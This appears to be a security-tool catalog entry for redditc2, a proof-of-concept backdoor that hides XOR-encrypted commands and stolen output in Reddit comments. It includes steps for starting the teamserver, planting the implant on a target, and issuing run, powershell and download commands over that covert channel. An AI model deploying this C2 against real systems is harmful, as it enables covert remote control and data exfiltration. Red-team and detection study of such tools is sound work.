---
name: "redditc2"
categories:
  - backdoor
version: "git (2023-01-18)"
homepage: "https://github.com/kleiton0x00/redditc2"
origin: "kitploit"
recipe: "upstream"
packaged-by: []
build-system: python
meta-checked: "2026-11-09"
github-repo: "kleiton0x00/redditc2"
github-stars: 277
github-pushed: "2023-01-18"
github-archived: false
github-match: "exact"
gh-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
worth: 3.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
license: see repository
github-issues: 0
---

# redditc2

> Proof-of-concept C2 that exchanges XOR-encrypted commands and output as comments on Reddit posts.

## What it's for

RedditC2 hides command-and-control inside ordinary Reddit traffic. The Python teamserver (built on PRAW) works against a subreddit you choose; each implant creates a post there — a "listener" — and tasking happens by posting an encrypted comment beginning `in:`. The implant polls that thread, executes locally, and replies with an encrypted `out:` comment; the teamserver then edits the command comment to "executed" (stealth mode additionally deletes it) so commands never re-run. Everything is XOR-encrypted with the shared key from the teamserver's `config.json`, so the network sees nothing but legitimate Reddit API calls. The repo ships a cross-platform Python implant (`Implant/Any/implant.py`), a Windows .NET agent (`Implant/Windows/RedditAgent`), and the teamserver (`TeamServer/teamserver.py`); per session it supports `run`, `powershell`, `download` and `upload`, with file transfers capped by Reddit's ~10 000-character comment limit. A lab tool for studying legitimate-service C2, unmaintained since early 2023.

## Typical use cases

### Start the teamserver

```
cd TeamServer
$EDITOR config.json
python3 teamserver.py
```

Outcome: after you fill `config.json` with your Reddit script-app credentials (`client_id`, `client_secret`, `username`, `password`, `user_agent`), the shared `xor_key` and `stealth_mode`, the teamserver authenticates to Reddit and drops you at the tab-completing `RedditC2>` prompt.

### Plant the implant on a target

```
$EDITOR implant.py
python3 implant.py
```

Outcome: once the Reddit credentials plus subreddit and listener names are set inside the file, the implant creates its listener post in that subreddit and starts polling for `in:` commands; on Windows run the prebuilt RedditAgent .NET executable instead.

### Operate a session

```
RedditC2> set subreddit lab-range
RedditC2> list listeners
RedditC2> use listener web01
web01> run whoami
web01> powershell Get-Process
web01> download notes.txt
```

Outcome: `set subreddit` scopes the session store, `list listeners` enumerates the implant posts found there, and `use listener` opens an interactive channel — its `run`/`powershell`/`download`/`upload` commands travel out as encrypted comments and come back as the implant's next `out:` reply.

*No corpus evidence — derived from upstream documentation.*
